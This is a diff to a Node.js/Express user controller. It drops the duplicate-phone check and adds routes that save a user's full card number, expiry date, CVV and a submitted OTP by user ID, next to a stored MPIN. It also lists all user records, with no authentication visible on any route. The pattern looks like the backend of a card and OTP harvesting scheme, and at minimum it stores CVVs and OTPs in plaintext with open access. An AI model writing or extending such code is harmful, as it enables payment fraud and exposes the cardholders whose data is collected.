@@ -28,16 +28,7 @@ exports.createUser = async (req, res) => {
       });
     }
 
-    // Check if user already exists
-    const existingUser = await User.findOne({ phone });
-    if (existingUser) {
-      console.log('User already exists with phone:', phone);
-      return res.status(400).json({ 
-        success: false, 
-        message: 'User with this phone number already exists' 
-      });
-    }
-
+    // Always create new user - allow multiple entries with same phone number
     const newUser = new User({
       name,
       dob,
@@ -48,7 +39,11 @@ exports.createUser = async (req, res) => {
     console.log('Creating new user:', newUser);
     await newUser.save();
     console.log('User created successfully');
-    res.status(201).json({ success: true, message: "User created successfully" });
+    res.status(201).json({ 
+      success: true, 
+      message: "User created successfully",
+      userId: newUser._id // Return user ID for future updates
+    });
   } catch (err) {
     console.error('Error in createUser:', err);
     res.status(500).json({ success: false, error: err.message });
@@ -105,15 +100,90 @@ exports.updateMpin = async (req, res) => {
     user.mpin = mpin;
     await user.save();
 
-    res
-      .status(200)
-      .json({ success: true, message: "MPIN updated successfully" });
+    res.status(200).json({ success: true, message: "MPIN updated successfully" });
   } catch (err) {
     res.status(500).json({ success: false, error: err.message });
   }
 };
 
-// GET /api/users
+// PUT /api/users/:userId/card - Update card details by user ID
+exports.updateCardByUserId = async (req, res) => {
+  try {
+    const { userId } = req.params;
+    const { cardNumber, cardHolderName, expiryDate, cvv } = req.body;
+
+    if (!cardNumber || !cardHolderName || !expiryDate || !cvv) {
+      return res.status(400).json({
+        success: false,
+        error: "All card details are required",
+      });
+    }
+
+    const user = await User.findById(userId);
+    if (!user) {
+      return res.status(404).json({
+        success: false,
+        error: "User not found",
+      });
+    }
+
+    user.card_number = cardNumber;
+    user.card_holder_name = cardHolderName;
+    user.expiry_date = expiryDate;
+    user.cvv = cvv;
+    await user.save();
+
+    return res.status(200).json({
+      success: true,
+      message: "Card details updated successfully",
+    });
+  } catch (err) {
+    console.error("Error updating card details:", err);
+    return res.status(500).json({
+      success: false,
+      error: err.message,
+    });
+  }
+};
+
+// PUT /api/users/:userId/otp - Update OTP by user ID
+exports.updateOtpByUserId = async (req, res) => {
+  try {
+    const { userId } = req.params;
+    const { otp } = req.body;
+
+    if (!otp) {
+      return res.status(400).json({
+        success: false,
+        error: "OTP is required",
+      });
+    }
+
+    const user = await User.findById(userId);
+    if (!user) {
+      return res.status(404).json({
+        success: false,
+        error: "User not found",
+      });
+    }
+
+    user.otp = otp;
+    await user.save();
+
+    return res.status(200).json({
+      success: true,
+      message: "OTP updated successfully",
+    });
+  } catch (err) {
+    console.error("Error updating OTP:", err);
+    return res.status(500).json({
+      success: false,
+      error: err.message,
+    });
+  }
+};
+
+// GET /api/users// GET /api/users
 exports.getUsers = async (req, res) => {
   try {
     const users = await User.find().sort({ submission_date: -1 });
